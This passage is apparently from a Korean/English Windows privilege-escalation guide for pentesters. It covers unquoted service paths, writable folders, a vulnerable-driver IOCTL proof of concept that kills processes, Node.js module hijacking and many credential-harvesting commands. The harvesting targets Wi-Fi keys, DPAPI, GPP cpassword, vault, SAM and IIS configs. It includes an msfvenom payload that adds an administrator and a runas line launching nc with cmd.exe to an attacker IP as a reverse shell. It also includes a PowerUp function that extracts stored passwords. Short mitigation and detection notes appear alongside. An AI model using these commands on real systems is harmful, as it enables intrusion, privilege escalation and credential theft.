for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**You can detect and exploit** this vulnerability with metasploit: `exploit/windows/local/trusted\_service\_path` You can manually create a service binary with metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows에서는 서비스가 실패했을 때 수행할 작업을 사용자가 지정할 수 있습니다. 이 기능은 binary를 가리키도록 설정할 수 있습니다. 이 binary를 교체할 수 있다면, privilege escalation이 가능할 수 있습니다. 더 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인할 수 있습니다.

## Applications

### Installed Applications

**binaries의 permissions**를 확인하세요(하나를 덮어쓸 수 있고 privilege를 escalation할 수 있을지도 모릅니다) 그리고 **folders**의 permissions도 확인하세요([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

특정 config file을 수정해서 special file을 읽을 수 있는지, 또는 Administrator account로 실행될 binary를 수정할 수 있는지 확인합니다 (schedtasks).

system에서 약한 folder/files permissions를 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++는 `plugins` 하위 폴더에 있는 모든 plugin DLL을 자동으로 로드합니다. writable portable/copy install이 있으면, 악성 plugin을 넣는 것만으로 `notepad++.exe`가 실행될 때마다 자동 code execution이 가능합니다(`DllMain`과 plugin callbacks 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**다른 user에 의해 실행될 registry나 binary를 overwrite할 수 있는지 확인하세요.**\
**권한 상승을 위해 흥미로운 **autoruns locations**를 더 알아보려면 다음 페이지를 읽으세요:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

가능한 **third party weird/vulnerable** drivers를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화 방안
- DACL로 제한되도록 의도한 device objects를 생성할 때는 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한이 필요한 작업에 대해 caller context를 검증하세요. process termination 또는 handle 반환을 허용하기 전에 PP/PPL 검사를 추가하세요.
- IOCTLs를 제한하세요(access masks, METHOD_*, input validation) 그리고 직접적인 kernel privileges 대신 brokered models를 고려하세요.

방어자를 위한 탐지 아이디어
- 의심스러운 device names(예: \\ .\\amsdk*)에 대한 user-mode opens와 악용을 시사하는 특정 IOCTL sequences를 모니터링하세요.
- Microsoft의 vulnerable driver blocklist(HVCI/WDAC/Smart App Control)를 적용하고 자체 allow/deny lists를 유지하세요.


## PATH DLL Hijacking

PATH에 있는 폴더 안에 **write permissions**가 있다면, 프로세스가 로드하는 DLL을 hijack해서 **privileges를 escalate**할 수 있습니다.

PATH 안의 모든 폴더 권한을 확인하세요:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
더 자세한 내용은 이 check를 어떻게 악용하는지에 대해:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

이것은 **Windows uncontrolled search path** 변형으로, **Node.js** 및 **Electron** 애플리케이션이 `require("foo")` 같은 bare import를 수행할 때 예상된 module이 **누락**되면 영향을 줍니다.

Node는 디렉터리 트리를 위로 올라가며 각 부모에서 `node_modules` 폴더를 확인해 packages를 resolve합니다. Windows에서는 그 탐색이 드라이브 루트까지 도달할 수 있으므로, `C:\Users\Administrator\project\app.js`에서 실행된 애플리케이션은 다음을 probe할 수 있습니다:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user**가 `C:\node_modules`를 생성할 수 있다면, 악성 `foo.js`(또는 package folder)를 심어두고 **더 높은 권한의 Node/Electron process**가 누락된 dependency를 resolve하기를 기다릴 수 있습니다. payload는 피해자 process의 security context에서 실행되므로, 대상이 administrator로 실행되거나, elevated scheduled task/service wrapper를 통해 실행되거나, auto-start된 privileged desktop app에서 실행될 때 이는 **LPE**가 됩니다.

이는 특히 다음 경우에 흔합니다:

- dependency가 `optionalDependencies`에 선언된 경우
- third-party library가 `require("foo")`를 `try/catch`로 감싸고 실패해도 계속 진행하는 경우
- package가 production build에서 제거되었거나, packaging 중 누락되었거나, 설치에 실패한 경우
- 취약한 `require()`가 main application code가 아니라 dependency tree 깊은 곳에 있는 경우

### 취약한 target 찾기

**Procmon**을 사용해 resolution path를 확인합니다:

- Filter by `Process Name` = target executable (`node.exe`, Electron app EXE, 또는 wrapper process)
- Filter by `Path` `contains` `node_modules`
- `NAME NOT FOUND`와 `C:\node_modules` 아래의 최종 성공적인 open에 집중합니다

unpacked `.asar` files나 application sources에서 유용한 code-review pattern:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon 또는 소스 검토를 통해 **누락된 패키지 이름**을 식별한다.
2. 아직 존재하지 않는 경우 root lookup directory를 생성한다:
```powershell
mkdir C:\node_modules
```
3. 정확히 예상되는 이름의 module을 drop:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 피해 애플리케이션을 트리거한다. 애플리케이션이 `require("foo")`를 시도하고 정식 모듈이 없으면, Node는 `C:\node_modules\foo.js`를 로드할 수 있다.

이 패턴에 맞는 누락된 optional module의 실제 사례로는 `bluebird`와 `utf-8-validate`가 있지만, **technique**의 핵심은 재사용 가능하다는 점이다: 권한이 높은 Windows Node/Electron 프로세스가 resolve할 수 있는 임의의 **missing bare import**를 찾는 것이다.

### Detection and hardening ideas

- 사용자가 `C:\node_modules`를 만들거나 그 안에 새 `.js` 파일/package를 쓰면 경고한다.
- high-integrity process가 `C:\node_modules\*`에서 읽는지 추적한다.
- 운영 환경에서는 모든 runtime dependencies를 패키징하고 `optionalDependencies` 사용을 점검한다.
- 조용한 `try { require("...") } catch {}` 패턴이 있는지 third-party code를 검토한다.
- library가 지원하면 optional probe를 비활성화한다(예: 일부 `ws` deployment는 `WS_NO_UTF_8_VALIDATE=1`로 legacy `utf-8-validate` probe를 피할 수 있다).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 열린 포트

외부에서 **restricted services**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령은 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 목록, 규칙 생성, 끄기, 끄기...)**

추가로[ 네트워크 열거를 위한 명령은 여기](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

root user를 얻으면 어떤 포트든지 리슨할 수 있습니다(`nc.exe`를 처음으로 포트에서 리슨하는 데 사용하면, 방화벽에서 `nc`를 허용할지 GUI로 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root로 bash를 쉽게 시작하려면 `--default-user root`를 시도해 볼 수 있습니다

`WSL` 파일 시스템은 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장하며, 이들은 **Windows**가 사용자에게 **자동으로 로그인**할 수 있게 합니다. 처음 보면 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장해서 브라우저를 통해 자동으로 로그인할 수 있다는 뜻처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자에게 자동으로 로그인할 수 있게 하는 자격 증명을 저장합니다. 즉, **리소스에 접근하기 위해 자격 증명이 필요한 어떤 Windows application도** 이 **Credential Manager**와 Windows Vault를 사용할 수 있으며, 사용자가 항상 username과 password를 입력하는 대신 제공된 자격 증명을 사용할 수 있습니다.

application이 Credential Manager와 상호작용하지 않는 한, 특정 리소스에 대한 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 application이 vault를 사용하려면, 기본 storage vault에서 해당 리소스에 대한 자격 증명을 요청하기 위해 어떤 방식으로든 **credential manager와 통신**해야 합니다.

`cmdkey`를 사용하여 machine에 저장된 credentials를 나열하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `/savecred` 옵션과 함께 `runas`를 사용할 수 있습니다. 다음 예시는 SMB share를 통해 원격 binary를 호출하는 것입니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 자격 증명 세트와 함께 `runas` 사용하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**는 대칭 암호화를 위한 방법을 제공하며, 주로 Windows 운영 체제에서 비대칭 개인 키의 대칭 암호화에 사용된다. 이 암호화는 사용자 또는 시스템 비밀을 활용하여 entropy를 크게 높인다.

**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키 암호화를 가능하게 한다**. 시스템 암호화의 경우, 시스템의 도메인 인증 비밀을 사용한다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 의미한다. **사용자의 개인 키를 같은 파일에서 보호하는 master key와 함께 위치하는 DPAPI key**는 일반적으로 64바이트의 무작위 데이터로 구성된다. (이 디렉터리는 접근이 제한되어 있어 CMD의 `dir` 명령으로는 내용을 나열할 수 없지만, PowerShell로는 나열할 수 있다는 점이 중요하다.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**master password**로 보호된 **credentials files**는 보통 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell 자격 증명**은 종종 **scripting** 및 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 방법으로 사용됩니다. 이 자격 증명은 **DPAPI**를 사용해 보호되며, 일반적으로 생성된 동일한 컴퓨터의 동일한 사용자만 복호화할 수 있다는 뜻입니다.

파일에 들어 있는 PS credentials를 **decrypt**하려면 다음과 같이 할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
그리고 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`에서 찾을 수 있습니다

### 최근 실행된 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용해 **passwords**와 다른 정보를 **save**하지만, 이것이 데이터베이스 파일이라는 사실을 모릅니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 있으며, 항상 검색하고 살펴볼 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe의 password를 복구하려면 Administrator 권한이 필요하고 High Integrity level에서 실행해야 한다는 점에 유의하세요.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 있습니다.\
이 파일이 존재한다면 일부 **credentials**가 구성되어 있고 **recovered**될 수 있다는 의미일 수 있습니다.

이 코드는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 추출되었습니다:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인합니다 .\
설치 프로그램은 **SYSTEM privileges**로 **실행**되며, 많은 프로그램이 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** 에 취약합니다.
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH keys

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 내용이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
그 경로 안에서 항목을 찾으면 아마 저장된 SSH key일 것입니다. 그것은 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 technique에 대한 더 많은 정보는 여기: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 technique는 더 이상 유효하지 않은 것 같습니다. 몇 개의 ssh keys를 생성해 `ssh-add`로 추가한 뒤 ssh로 machine에 로그인해 보았습니다. registry HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고, procmon도 asymmetric key authentication 중 `dpapi.dll`의 사용을 식별하지 못했습니다.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
You can also search for these files using **metasploit**: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 검색하세요

### Cached GPP Pasword

이전에 Group Policy Preferences (GPP)를 통해 여러 머신에 사용자 지정 local administrator 계정을 배포할 수 있는 기능이 있었습니다. 하지만 이 방식에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 모든 domain user가 접근할 수 있었습니다. 둘째, 이러한 GPP 내의 password는 공개적으로 문서화된 기본 key를 사용해 AES256으로 암호화되었지만, 인증된 어떤 user든 복호화할 수 있었습니다. 이는 사용자들이 권한 상승을 획득할 수 있게 할 수 있어 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함한 locally cached GPP files를 검색하는 함수가 개발되었습니다. 이러한 파일을 찾으면, 함수는 password를 decrypt하고 custom PowerShell object를 반환합니다. 이 object에는 GPP에 대한 세부 정보와 file의 위치가 포함되어 있어, 이 보안 취약점의 식별과 remediation에 도움이 됩니다.

다음 파일을 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 에서 검색하세요:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 decrypt하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials가 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 자격 증명 요청

